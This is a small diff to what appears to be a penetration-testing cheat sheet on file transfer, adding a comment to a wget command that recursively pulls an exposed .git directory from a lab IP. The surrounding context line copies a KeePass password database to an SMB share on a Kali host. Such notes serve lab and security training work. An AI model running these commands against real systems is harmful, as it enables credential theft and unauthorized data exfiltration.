@@ -143,7 +143,7 @@ copy Passwords.kdbx(windows filename) \\kali ip\sharename\Passwords.kdbx
 ### Http
 ```
 wget url
-wget -r --no-parent http://192.168.188.144/.git/
+wget -r --no-parent http://192.168.188.144/.git/ #includes subdir and files
 
 curl url -o saved_file_path
 ```
